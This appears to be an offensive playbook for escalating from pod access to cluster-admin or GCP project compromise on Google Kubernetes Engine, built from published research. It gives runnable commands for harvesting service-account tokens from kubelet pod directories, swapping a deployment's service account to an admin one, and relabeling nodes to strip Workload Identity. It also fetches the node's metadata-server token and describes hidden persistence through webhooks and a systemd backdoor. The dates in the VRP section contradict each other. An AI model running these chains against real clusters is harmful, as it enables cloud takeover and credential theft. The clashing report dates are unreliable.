# Real-world GKE privesc chains (VRP + published research)

Concrete, accepted chains from Google VRP and top researchers. These are the techniques that turn "pod access" into "cluster-admin / project compromise" in practice. Use as the privesc playbook once you land inside a pod or on a node.

Index of sources at the end. Most map to fixes Google has since deployed — confirm the target's GKE version / mode (Standard vs Autopilot) before assuming a chain works.

---

## A. Projected SA token harvesting via hostPath DaemonSet  ← highest practical value
**Source:** Unit42 — FluentBit + Anthos Service Mesh dual privesc chain.

A DaemonSet that mounts `/var/lib/kubelet/pods` (FluentBit, Datadog, logging/monitoring agents commonly do) exposes the per-pod `kube-api-access-<random>/token` directories — the **projected service account tokens of every pod scheduled on that node**.

```bash
# From a compromised node or a pod with /var/lib/kubelet/pods mounted:
find /var/lib/kubelet/pods -path '*kube-api-access*/token' 2>/dev/null
# Each token authenticates as that pod's ServiceAccount. Decode to see which SA:
for t in $(find /var/lib/kubelet/pods -path '*kube-api-access*/token'); do
  echo "== $t"; cut -d. -f2 < "$t" | base64 -d 2>/dev/null | jq -r '."kubernetes.io".serviceaccount.name'
done
```
Then impersonate the most privileged one against the API server (see section C for what to look for). This is why **`automountServiceAccountToken: false`** and **not mounting `/var/lib/kubelet/pods`** matter.

---

## B. GKE Autopilot pod → node → shadow admin
**Source:** Unit42 — "Container Escape to Shadow Admin: GKE Autopilot Vulnerabilities."

Autopilot blocks privileged pods via policy, but the chain bypassed it:
1. **`allowlistedworkloads` CRD masquerade** — Autopilot allow-lists vetted agents (e.g. Datadog) to mount host paths. Verification only checked **image name + command**, not the actual code. Deploy a pod *named/imaged* like the vetted agent but running attacker code → gets the allowed `/var/lib/kubelet/pods` + containerd socket mount.
2. **containerd socket → privileged container** → mount host FS → systemd backdoor → node compromise.
3. **`nodeName` scheduling bypass** — Autopilot blocks `nodeSelector` but allows the `nodeName` field. Pin the breakout pod onto a node hosting `metrics-server` / `stackdriver-metadata-agent-cluster-level`.
4. Harvest those system pods' tokens (section A) → they have **`update deployments`** → swap `spec.template.spec.serviceAccountName` to an admin SA (section D) → reach **CRAC** (section C) → cluster-admin.
5. **Persistence:** install a **mutating admission webhook** — Autopilot operators historically *could not list* mutating webhooks, making the backdoor invisible.

---

## C. clusterrole-aggregation-controller (CRAC) abuse  ← key privesc primitive
**Source:** both Unit42 chains.

`clusterrole-aggregation-controller` (kube-system) can **add arbitrary permissions to existing ClusterRoles via aggregation labels**. If you obtain its token (via A or D), you grant yourself cluster-admin without needing `escalate`/`bind` directly:
```bash
# With the CRAC token, create/patch a ClusterRole whose aggregation rules pull in everything,
# or label a role you control so CRAC aggregates broad rules into it.
kubectl auth can-i --list   # confirm token == system:serviceaccount:kube-system:clusterrole-aggregation-controller
```
Treat **any path to the CRAC SA as effectively cluster-admin.**

---

## D. "update/patch deployments" == cluster-admin (SA-swap)
**Source:** Unit42 Autopilot chain.

A SA with only `update`/`patch` on `deployments` (metrics-server, many "operational" roles) is **not** low-priv: change a deployment's `spec.template.spec.serviceAccountName` to a high-priv SA, add/replace a container, and the new pod is handed that SA's token.
```bash
kubectl -n kube-system patch deployment <dep> --type merge \
  -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-admin-sa>"}}}}'
# then read the mounted token from the new pod
```
Generalize: when triaging RBAC, treat `update/patch` on `deployments|daemonsets|statefulsets|cronjobs|jobs|pods` (anything that creates pods) + ability to set `serviceAccountName` as a privesc primitive.

---

## E. Workload Identity / GKE Metadata protection — downgrade via node relabel (CONFIRMED)
**Source:** Google Cloud VRP report by **Jakub Domeracki**, *"Privilege escalation via GKE Metadata protection downgrade attack scenario"* — `bughunters.google.com/reports/vrp/BrQZ18W5k` (public report, id `5516653043449856`). Created 2024-11-03, status **FIXED**, patched 2024-08-22 (GKE release notes Aug 28 2025), reward field `500000`. The detail below is the **actual report content** (fetched via `GET https://bughunters.google.com/rest/v1/reports/5516653043449856?key=<bughunters_pa_apiKey>`), not inferred.

### Root cause
Both metadata protections work by running a **DaemonSet that proxies traffic to the GCE Metadata Server**, scheduled onto nodes purely by a **node label** (`nodeSelector`):

| Protection | DaemonSet | Node label (nodeSelector) |
|---|---|---|
| Workload Identity Federation (WIF) | `gke-metadata-server` | `iam.gke.io/gke-metadata-server-enabled: "true"` |
| Metadata Concealment (legacy) | `metadata-proxy-v0.1` | `cloud.google.com/metadata-proxy-ready: "true"` |

**Key flaw:** `metadata-proxy-v0.1` is **preinstalled even when WIF is explicitly enabled at cluster creation**. Because scheduling is driven only by mutable node labels, anyone who can **patch node labels** can turn WIF off and swap in (weaker) Metadata Concealment at runtime — disproving the docs claim that concealment "can only be enabled when creating a cluster/node pool."

### Preconditions
- Cluster + all node pools provisioned with **WIF enabled** (the recommended hardening — this attack defeats it).
- Attacker controls a workload/account with node-label power, via **either**:
  - K8s RBAC: `verbs: ["get","list","patch"]` on `resources: ["nodes"]`, **or**
  - GCP IAM: `container.nodes.list` + `container.nodes.update`. Note `roles/container.developer` (Kubernetes Engine Developer) **already includes `container.nodes.update`** → sufficient to label nodes.
- **GKE Standard only.** GKE Autopilot blocks it: *GKE Warden* admission controller prevents labeling nodes.

### Exploit (run from a compromised pod that can patch nodes)
```sh
kubectl auth can-i patch nodes        # confirm primitive
for node in $(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers); do
  # turn OFF WIF (evict gke-metadata-server from the node)
  kubectl label nodes $node iam.gke.io/gke-metadata-server-enabled=false --overwrite
  # turn ON metadata concealment — which does NOT block the SA token endpoint
  kubectl label nodes $node cloud.google.com/metadata-proxy-ready=true
done
# gke-metadata-server is gone → the pod now reaches the NODE's identity directly
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"  -H "Metadata-Flavor: Google"
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" -H "Metadata-Flavor: Google"
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" --http1.1
```
**Impact:** with WIF removed the pod fetches the **node's GCE SA token**. By default that's the Compute Engine default SA, frequently with the broad `cloud-platform` scope / Editor role (Datadog: ~15% of GKE clusters run a privileged node SA) → lateral movement across GCP APIs + persistence. Metadata Concealment does **not** stop this because it doesn't filter the SA-token path.

Cleanup (restore WIF): `kubectl label nodes $node iam.gke.io/gke-metadata-server-enabled=true --overwrite` and remove `cloud.google.com/metadata-proxy-ready-`.

### Reporter's proposed invariant & mitigations
- Security invariant: *it must be impossible to disable WIF from inside the cluster via the K8s API* — toggling it should require Cloud IAM perms + node-pool/cluster recreation.
- Don't preinstall `metadata-proxy-v0.1` unless concealment is explicitly enabled.
- Validating admission policy preventing overwrite of these labels (as GKE Warden does on Autopilot).
- Downscope `roles/container.developer` to exclude `container.nodes.update` (reserve for `roles/container.admin`).

### Also test (general WIF caveats, not part of this report)
- **Host-network / node access** — once you're *on the node* (section A/B) you bypass the pod-scoped metadata server entirely and read the node SA token directly.
- Always test both the WI-bound token **and** a direct `169.254.169.254` hit; check **every node pool** — one mislabeled/misconfigured pool defeats the cluster's WI posture.

---

## F. Kubelet TLS bootstrap / kube-env
**Source:** Rhino Security Labs — GKE Kubelet TLS Bootstrap Privilege Escalation.

Complements SKILL.md §4.2. Legacy `kube-env` metadata leaks the bootstrap credentials; with the kubelet/bootstrap identity you can request node certs and, via the Node authorizer, read Secrets of pods on the node. Mitigated by metadata concealment + `disable-legacy-endpoints=true` + WI.

---

## Triage shortcut: what to grab once inside
1. `kubectl auth can-i --list` for the current token.
2. `find /var/lib/kubelet/pods -path '*kube-api-access*/token'` (section A).
3. Hunt for tokens of: `clusterrole-aggregation-controller`, `*-controller` SAs, `metrics-server`, `stackdriver-metadata-agent-*`, anything with `update deployments`.
4. Try both WI-bound token and direct `169.254.169.254` node SA (section E).
5. CRAC reachable? → cluster-admin (section C).

---

## Sources
- Unit42 — GKE Autopilot "Container Escape to Shadow Admin": https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/
- Unit42 — FluentBit + Anthos Service Mesh dual privesc: https://unit42.paloaltonetworks.com/google-kubernetes-engine-privilege-escalation-fluentbit-anthos/
- Google VRP — GKE Metadata protection downgrade (Jakub Domeracki, PUBLIC, FIXED): https://bughunters.google.com/reports/vrp/BrQZ18W5k — JSON body via `GET https://bughunters.google.com/rest/v1/reports/5516653043449856?key=<key>`
- Jakub Domeracki — bypassing WIF GKE Metadata Protection (jdsec.cloud)
- Rhino Security Labs — GKE Kubelet TLS Bootstrap Privesc: https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/
- Rhino Security Labs — GCP IAM privesc (impersonation/actAs): https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- xdavidhu/awesome-google-vrp-writeups: https://github.com/xdavidhu/awesome-google-vrp-writeups
- GKE security bulletins: https://docs.cloud.google.com/kubernetes-engine/security-bulletins
